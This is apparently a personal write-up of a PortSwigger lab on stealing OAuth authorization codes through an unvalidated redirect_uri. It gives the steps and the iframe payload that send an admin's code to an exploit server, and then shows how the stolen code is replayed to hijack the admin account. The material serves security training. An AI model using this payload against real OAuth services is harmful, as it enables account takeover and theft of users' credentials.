
# #PortSwigger 



![[Pasted image 20251224161354.png]]


## Lab Description

>This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
>
>**Objective:** Steal an authorization code associated with the admin user, then use it to access their account and delete the user carlos.
>
>**Credentials:** `wiener:peter`
>
>The admin user will open anything you send from the exploit server and always has an active session with the OAuth service.

---
---

### Step 1: Study the OAuth Flow

1. Click **"My account"** and complete the OAuth login with `wiener:peter`
2. Log out and log back in (you're logged in instantly due to active OAuth session)
3. In Burp Proxy, find the `GET /auth` request:
```
GET /auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email
```

4. Send this request to Repeater

![[Pasted image 20251224162725.png]]


---

### Step 2: Test redirect_uri Validation

**In Repeater, change `redirect_uri` to an arbitrary value:**
```
redirect_uri=https://example.com
```

**Observe:** No error → The OAuth provider accepts any `redirect_uri`!

**Test redirect:**
```
redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Send the request and follow the redirect. Check the exploit server access log.

**Log entry found**
```
GET /?code=AUTHORIZATION_CODE&...
```

Confirms you can leak authorization codes to an external domain.

---

### Step 3: Create the Exploit

**On the exploit server, create `/exploit`:**
```
<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
```


![[Pasted image 20251224162704.png]]

**Replace:**

- `oauth-YOUR-LAB-OAUTH-SERVER-ID` --> Your OAuth server ID
- `YOUR-LAB-CLIENT-ID` --> Your client ID
- `YOUR-EXPLOIT-SERVER-ID` --> Your exploit server ID

![[Pasted image 20251224163509.png]]


---

### Step 4: Test the Exploit

1. Click **Store** on the exploit server
2. Click **View exploit**
3. Check the exploit server **Access log**

**Expected log entry:**
```
GET /?code=VICTIM_CODE&...
```


---

### Step 5: Deliver to the Victim

1. Click **Deliver exploit to victim**
2. The victim loads the iframe --> their authorization code is sent to your exploit server
3. Check the **Access log** again:
```
GET /?code=STOLEN_CODE&...
```


![[Pasted image 20251224163639.png]]

**Copy the stolen authorization code.**

---

### Step 6: Use the Stolen Code

1. Log out of the blog website
2. Navigate to:
```
https://YOUR-LAB-ID.web-security-academy.net/oauth-callback?code=STOLEN_CODE
```

3. The OAuth flow completes automatically
4. You are logged in as the **admin user**!


![[Pasted image 20251224163716.png]]


---

### Step 7: Delete Carlos

1. Go to the admin panel
2. Click **Delete** next to `carlos`


![[Pasted image 20251224164248.png]]


![[Pasted image 20251224164310.png]]



---

### Step 8: Lab Solved

![[Pasted image 20251224164329.png]]


---
---
